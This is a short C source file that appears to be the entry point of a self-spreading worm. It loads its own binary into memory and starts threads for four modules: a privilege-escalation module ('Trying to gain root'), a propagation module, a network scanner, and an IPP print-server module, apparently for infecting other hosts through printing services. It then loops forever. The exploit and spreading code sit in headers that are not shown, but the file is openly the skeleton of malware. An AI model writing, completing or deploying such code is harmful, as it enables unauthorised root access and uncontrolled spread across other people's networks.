#include "ipp_server.h"
#include "lpe.h"
#include "propagate.h"
#include "scanner.h"
#include "utils.h"

void * start_propagate(void *varg){
    Globals *global = (Globals *) varg;
    DEBUG_LOG("[ENTRY] Starting propagation module...\n");
    propagate(global);
}
void * start_network_scanner(void *varg){
    Globals *global = (Globals *) varg;
    DEBUG_LOG("[ENTRY] Starting network-scanner module...\n");
    scan_net(global);
}

void * start_ipp_server(void *varg){
    Globals *global = (Globals *) varg;
    DEBUG_LOG("[ENTRY] Starting ipp-server module...\n");
    serve(global);
}

void * start_lpe(void *varg){
    DEBUG_LOG("[LPE] Trying to gain root...\n");
    try_get_root(varg);
}

void entry(Globals *global) {
    // load the file content into the global buffer
    load_file_bytes(global);

    // try to gain root
    pthread_t thread_id_lpe;
    global->pthread_create(&thread_id_lpe, NULL, start_lpe, global);

    // start propagate
    pthread_t thread_id_propagate;
    global->pthread_create(&thread_id_propagate, NULL, start_propagate, global);

    // start network scanner
    pthread_t thread_id_scanner;
    global->pthread_create(&thread_id_scanner, NULL, start_network_scanner, global);

    // start ipp server
    pthread_t thread_id_ipp;
    global->pthread_create(&thread_id_ipp, NULL, start_ipp_server, global);


    DEBUG_LOG("[ENTRY] Started all modules!\n");
    // keep running
    while(1){
        TRAP;
        global->sleep_ms(100);
    }
}